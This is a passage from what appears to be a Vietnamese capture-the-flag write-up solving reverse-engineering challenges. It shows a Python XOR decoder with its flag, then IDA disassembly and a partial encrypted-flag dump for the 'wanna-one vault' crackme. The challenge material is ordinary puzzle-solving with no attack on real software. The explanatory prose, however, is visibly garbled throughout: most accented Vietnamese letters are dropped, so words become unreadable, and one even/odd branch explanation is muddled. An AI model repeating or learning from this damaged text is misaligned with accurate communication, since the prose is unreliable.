<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enc<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;^8rq9{Vd:VyesV~9|emVph6t&#39;</span>
</span></span><span style="display:flex;"><span>enc<span style="color:#f92672">=</span>list(enc)
</span></span><span style="display:flex;"><span>dec<span style="color:#f92672">=</span>[]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> enc:
</span></span><span style="display:flex;"><span>    dec<span style="color:#f92672">.</span>append(i<span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> dec))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{x0r_m3_plz_w0uld_ya?}</code></p>
<h2 id="wanna-one-vault">wanna-one vault</h2>
<p><code>Description: Hear me out, I disabled the security system so that I could easily dump the vault firmware, now help me decipher the firmware and break into the vault and steal their confidential intels.</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/wanna-one-vault">wanna-one-vault</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                                                                                           <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> file wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>vault                                                                                                                                          <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>vault: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB pie executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span><span style="color:#ae81ff">18e2</span>d06b27d74777cea8e784139816bfb61f45d4, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, not stripped
</span></span></code></pre></div><p>-&gt; Vn l 1 file ELF 64 bit (khng b stripped), mnh tin hnh load vo <code>IDA</code>  dch ngc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000134</span>C                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001353</span>                 mov     edx, <span style="color:#ae81ff">30</span>h ; <span style="color:#e6db74">&#39;0&#39;</span>  ; nbytes
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span><span style="color:#ae81ff">8</span>                 mov     rsi, rax        ; buf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span>B                 mov     edi, <span style="color:#ae81ff">0</span>          ; fd
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001360</span>                 call    _read
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001365</span>                 mov     [rbp<span style="color:#f92672">+</span>var_2001D4], eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000136</span>B                 cmp     [rbp<span style="color:#f92672">+</span>var_2001D4], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001372</span>                 jg      <span style="color:#66d9ef">short</span> loc_137E
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001374</span>                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span><span style="color:#ae81ff">9</span>                 call    _exit
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E loc_137E:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span><span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D4]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">84</span>                 sub     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">87</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">89</span>                 mov     byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">91</span>                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">98</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>B                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A0                 cmp     rax, <span style="color:#ae81ff">20</span>h ; <span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A4                 jz      <span style="color:#66d9ef">short</span> loc_13BF
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A6                 lea     rax, s          ; <span style="color:#e6db74">&#34;Invalid vault key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>AD                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>B0                 call    _puts
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>B5                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BA                 call    _exit
</span></span></code></pre></div><p>Nhn vo m assembly, mng chng ta cn nhp vo phi cha 0x20 k t v nhy vo <code>loc_13CE</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CE loc_13CE:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>CD<span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CE                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D4                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D6                 movzx   eax, byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>DE                 movsx   rdx, al
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E2</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>EA                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">2</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span>A                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001402</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span>A                 xor     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span>D                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001413</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001415</span>                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141</span>D                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001423</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001425</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000142</span>D                 shl     rax, <span style="color:#ae81ff">10</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001431</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001434</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000143</span>A                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000143</span>C                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001444</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>A                 and     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>D                 test    eax, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144F</span>                 jz      <span style="color:#66d9ef">short</span> loc_147C
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001451</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001457</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000145</span><span style="color:#ae81ff">9</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001461</span>                 xor     rax, <span style="color:#ae81ff">2070</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001467</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000146</span>A                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001470</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001472</span>                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>A                 jmp     <span style="color:#66d9ef">short</span> loc_14A5
</span></span></code></pre></div><p>D thy  <code>rbp+var_2001D8</code> cha bin m, mnh tm t l <code>idx</code>, thc hin 1 s php ton i vi tng k t trong mng mnh nhp vo, ta thy sau  c ch th sau:</p>
<p>u tin l xor tng k t vi idx, sau  dch tri 0x10 <code>shl rax, 10h</code> -&gt; <code>val = (y ^ idx) &lt;&lt; 0x10</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001444</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>A                 and     eax, <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Chng kim tra <code>idx</code> l chn hay l, nu chn s nhy ti <code>loc_147c</code>, ngc li th s tip tc</p>
<p>Nu idx chn s xor gi tr <code>val</code> bn trn vi 0x2070, cn chn th s ti loc_147c v xor <code>val</code> vi 0x7020:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>C loc_147C:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1E1</span><span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>C                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">82</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">84</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">8</span>C                 xor     rax, <span style="color:#ae81ff">7020</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">92</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">95</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">9</span>B                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">9</span>D                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5
</span></span></code></pre></div><p>Khi qut ha:</p>
<pre><code>   chn: ((y ^ idx) &lt;&lt; 0x10) ^ 0x7020
   l  : ((y ^ idx) &lt;&lt; 0x10) ^ 0x2070
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5 loc_14A5:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>C<span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>AB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>AD                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>B5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>BB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>BD                 xor     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C0                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C6                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C8                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D0                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D6                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D8                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E0</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E6</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E8</span>                 lea     rcx, ds:<span style="color:#ae81ff">0</span>[rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span><span style="color:#ae81ff">0</span>                 lea     rax, enc_flag     <span style="color:#f92672">-&gt;</span> enc_flag array
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span><span style="color:#ae81ff">7</span>                 mov     rax, [rcx<span style="color:#f92672">+</span>rax]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span>B                 cmp     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span>E                 jz      <span style="color:#66d9ef">short</span> loc_1519
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001500</span>                 lea     rax, s          ; <span style="color:#e6db74">&#34;Invalid vault key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001507</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000150</span>A                 call    _puts
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000150F</span>                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001514</span>                 call    _exit
</span></span></code></pre></div><p>Cui cng chng trnh s ly gi tr va c tnh  trn <code>xor</code> li vi idx v kim tra vi tng k t tng ng ca mng enc_flag trong chng trnh.</p>
<p><code>enc_flag</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002020</span>                 public enc_flag
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002020</span> enc_flag        db  <span style="color:#ae81ff">20</span>h                 ; DATA XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">282</span><span style="color:#960050;background-color:#1e0010"></span>o
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002021</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002022</span>                 db  <span style="color:#ae81ff">57</span>h ; W
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002023</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002024</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002025</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002026</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002027</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">71</span>h ; q
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>A                 db  <span style="color:#ae81ff">30</span>h ; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002030</span>                 db  <span style="color:#ae81ff">22</span>h ; <span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002031</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002032</span>                 db  <span style="color:#ae81ff">79</span>h ; y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002033</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002034</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002035</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002036</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002037</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">73</span>h ; s
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>A                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002040</span>                 db  <span style="color:#ae81ff">24</span>h ; <span style="color:#960050;background-color:#1e0010">$</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002041</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002042</span>                 db  <span style="color:#ae81ff">35</span>h ; <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002043</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002044</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002045</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002046</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002047</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">75</span>h ; u
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>A                 db  <span style="color:#ae81ff">71</span>h ; q
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002050</span>                 db  <span style="color:#ae81ff">26</span>h ; <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002051</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002052</span>                 db  <span style="color:#ae81ff">59</span>h ; Y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002053</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002054</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002055</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002056</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002057</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">77</span>h ; w
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
